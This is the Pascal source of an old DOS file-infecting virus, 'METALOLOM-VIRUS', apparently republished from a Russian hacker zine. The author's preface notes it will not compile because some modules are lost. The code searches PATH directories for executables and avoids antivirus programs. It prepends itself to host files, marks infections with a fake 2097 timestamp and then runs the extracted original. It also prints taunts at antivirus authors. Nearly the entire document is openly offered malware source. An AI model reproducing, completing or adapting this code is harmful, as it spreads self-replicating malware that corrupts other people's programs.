(*
  И вот перед Вами мой самый первый вирус написанный на Turbo-Pascal 5.5
  Скомпилировать без переделки его невозможно из-за утери некоторых
  модулей и моей лени ;)
  Публикация в <Chaos Computer> предназначена исключительно для удовлетворения
  любопытства страждущих.
  И нефиг тащиться из этого сорца, я писал это в 12-летнем возрасте !!!
  Вообщем смотрите. Апгрейдить можно ;)
*)


{$M 10000,0,10000}
Program HLLP_Virus_Ver_3_00;
 Uses TpCrt,Dos,TpString,My4,TpDos;
 { Модуль My4 можно не использовать, но придется переделывать}
label 11,12;
Const
 Rek = 1024;    { раз. буфера }
 Maska = 7929;     { размер вируса }
 recSize = 2643;      { размер буфера обмена }
 tto = 3; { кол. проходов }
  Var
   DirInfo : SearchRec;
   Str,NN,NN1,dir,Concate,fullname,name,fullname1 : String;
   Y,M,D,DOW : Word;
   S: PathStr;
   F : File;
   Puti : array [0..10] of string;
   Files : array [1..10] of string;
   st,ss,InfName,dirv:string;
   III : integer;
   FileIn, FileOut : File;
   NumRead, NumWritten : Word;
   Buf1 : Array [1..1024] of char;
   I,uu : Integer;

{ ------ Область процедур ------------------------------ }
Function Find(Name:String):Boolean;
 var
  S: PathStr;
  i,j,p: Integer;

begin
  j:=0;
  st:=GetEnv('PATH');
  {writeln(st);}
  while st<>'' do
  begin
   For i:=1 to Length(st) do
    begin
     if (st[i]=';') or (i=length(st)) then
     begin
      puti[j]:=copy(st,1,i-1);
      delete(st,1,i);
      inc(j);
      break;
     end;
    end;
  end;
 randomize;
 p:=random(j);
 i:=0;j:=1;

    if puti[p][length(puti[p])]='\' then SS:=Puti[p]+'*.EXE' else SS:=Puti[p]+'\*.EXE';
    FindFirst(SS,Archive,Dirinfo);
    While doserror = 0 do
     begin
      Files[j]:=Puti[p]+'\'+Dirinfo.Name;
      FindNext(Dirinfo);
      inc(j);
     end;
end;

 Function Exist(Var name:openstring):boolean;
 {Функция ищет файл и возвращае TRUE и имя файла в переменной Name
 В противном случае возвращается FALSE и Name не определена}
   var
     s:PathSTR;
     begin
      s:=FSearch(Name,GetEnv('PATH'));
      Exist:=(s<>'');
      If s<>'' then Name:=FExpand(S)
   end;{Exist}


{ ------------- Процедура для копирования ---------------------------}

Procedure Copy_To(Input_F,Output_F:String);

(* Const
  recSize = 3866;      { размер буфера обмена } *)

  Var
   FileIn, FileOut : File;
   NumRead, NumWritten : Word;
   Buf : Array [1..RecSize] of char;
   I : Integer;

  Begin
   Assign(FileIn,Input_F); {$I-}
   Reset(FileIn,1);        {$I+}
   if IOResult <> 0 then Halt;
    { Открываем файл приемник }
   Assign(FileOut,Output_F);
   Rewrite(FileOut,1);
for i:=1 to tto do begin
{   repeat}
     BlockRead(FileIn,Buf,RecSize,NumRead);
     BlockWrite(FileOut,Buf,Numread,NumWritten);
{   until
     (NumRead = 0) or (NumWritten =9000);}
end;
   Close(FileIn);  Close(FileOut);
  End;

Procedure make_Infect(File_Name : String);
 Var
  DT:DateTime;
  Time:LongInt;
  F : text;
Begin
  dt.year:=2097;
  dt.day:=28;
  dt.month:=8;

  PackTime(Dt,time);
  Assign(F,File_Name);
  Reset(F);
  SetFTime(F,Time);
  Close(F);

End;
{ Процедуру использовать при уверенности наличия файла }
Function Control_Infect(File_Name:String): Boolean;
 Var
  DT:DateTime;
  Time:LongInt;
  F : text;
  SSS : Boolean;
Begin
 SSS:=false;
  findfirst(File_NAme,archive,dirinfo);
  unpacktime(dirinfo.time,dt);
  If (dt.day=28) and (dt.month=8) and (dt.year=2097) then SSS:=True;
Control_Infect:=SSS;

End;


 Begin
 iii:=1;
  STR:=ParamStr(0); { Возвращает имя текущего файла }
  STR:=JustFileName(STR);

  Copy_to(STR,'VIR');
11:Find('*.exe');
{  FindFirst('*.Exe',Archive,DirInfo);}
12:Infname:=Files[iii];
  If JustPathname(infname) = 'ADINF.EXE' then goto 11;
  If JustPathname(infname) = 'TURBO.EXE' then goto 11;
  If JustPathname(infname) = STR then goto 11;

{  If Doserror <> 0 then halt;}
{  If DosError = 18 then Halt;}

If Control_Infect(infname) then Begin Inc(iii);Goto 12; End;;
{If DosError = 18 then BEGIN
WriteLn(' Все вкустное уже съедено !!! ');
WriteLn(' А у вас ДОС загнулся, хи-хи(Какую-то инфекцию сейчас я проглотил ...');
HALT;
END;}

{end;}

  If DosError = 18 then halt;
  Assign(F,infName);
  dir:=infname;
{  Exist(dir);}
  Fullname:=Dir;
  Dir:=JustPathName(Dir);
  FindFirst('v',Archive,DirInfo);
  dirv:=Dir+'\v';
  If DosError <> 0 Then Rename(F,Dirv) else Begin
  WriteLn(' Без паники !!! '); halt; End;
  Concate:='copy/b>nul vir + '+Dir+'\v '+Fullname;
  My4.ExecDos(COnCATE);
  Assign(F,Dirv);
  Erase(f);
  Assign(F,'VIR');
  Erase(f);
{  Fullname:=JustFileName(FullName);}
  Make_Infect(FullName);
{  WriteLn('Abnormal program terminated ... ');}
  IF Str='AIDSTEST.EXE' then WriteLn('И вот я в Aidstest-е !!! Ха-Ха-Ха ');
  IF Str='WEB.EXE' then WriteLn('Привет Игорю Данилову ... ');
  GetDate(Y,M,D,Dow);
  If Y=1996 then WriteLn('METALOLOM-VIRUS  Version 3.0  (c) Clug ');
{ ════════════════════════════════════════════════════════════ }
 {   выполнение зараженной программы }
{ ════════════════════════════════════════════════════════════ }
   Assign(FileIn,Str); {$I-}
   Reset(FileIn,1);        {$I+}
   if IOResult <> 0 then
   begin
   WriteLn(' Programm Header error !!! ');
   Halt;
   end;
    { Открываем файл приемник }
   Assign(FileOut,'$metal.exe');
   Rewrite(FileOut,1);
   Seek(FileIn,Maska);
   repeat
     BlockRead(FileIn,Buf1,rek,NumRead);
     BlockWrite(FileOut,Buf1,Numread,NumWritten);
   until (NumRead = 0) or (NumWritten <> NumRead);

  Close(FileIn);  Close(FileOut);

Exec('$metal.exe ',Paramstr(1));
Assign(f,'$metal.exe');
Erase(F);
 End.
